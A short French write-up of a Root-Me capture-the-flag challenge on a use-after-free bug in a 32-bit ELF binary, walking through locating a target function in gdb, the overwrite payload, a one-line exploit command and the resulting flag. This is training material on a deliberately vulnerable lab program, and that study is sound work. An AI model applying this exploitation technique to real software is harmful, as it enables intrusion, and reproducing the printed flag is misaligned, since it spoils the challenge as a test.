# [ELF x86 - Use After Free - basic](https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x86-Use-After-Free-basic)

L'objectif de ce challenge est d'exploiter une vulnérabilité de type _Use After Free_ pour exécuter la fonction `bringBackTheFlag` et récupérer le flag stocké dans le fichier `.passwd`.

## Localisation de l'adresse de la fonction cible

Pour identifier l'adresse de la fonction `bringBackTheFlag`, on utilise `gdb` :  

```bash
gdb ./ch63
```

On peut ensuite afficher l'adresse de la fonction :  

```
(gdb) info address bringBackTheFlag 
Symbol "bringBackTheFlag" is at 0x80487cb in a file compiled without debugging.
```

## Exploitation de la vulnérabilité

Le programme gère deux structures :
- Une structure `Dog`, qui contient un pointeur vers la fonction `bringBackTheFlag`.
- Une structure `DogHouse`, qui peut réutiliser la mémoire libérée par un objet `Dog` après sa libération.

L'objectif est de réutiliser la mémoire libérée de la structure `Dog` (via la fonction `death`) et de remplacer son pointeur `bark` avec l'adresse `0x80487cb`.

L'entrée `AAAAAAAAAAAA\xcb\x87\x04\x08` permet de remplir le champ `address` de `DogHouse` en positionnant l'adresse `0x80487cb` dans le champ `bark` de l'ancienne structure `Dog`.

Le programme affiche le flag après avoir appelé la fonction `bringBackTheFlag`.

La commande suivante permet de récupérer le flag :

```bash
printf "1\ndog\n4\n5\nAAAAAAAAAAAA\xcb\x87\x04\x08\n\n3\n0\n" | ./ch63
```

Le flag est ensuite affiché : `U44aafff_U4f_The_d0G`.
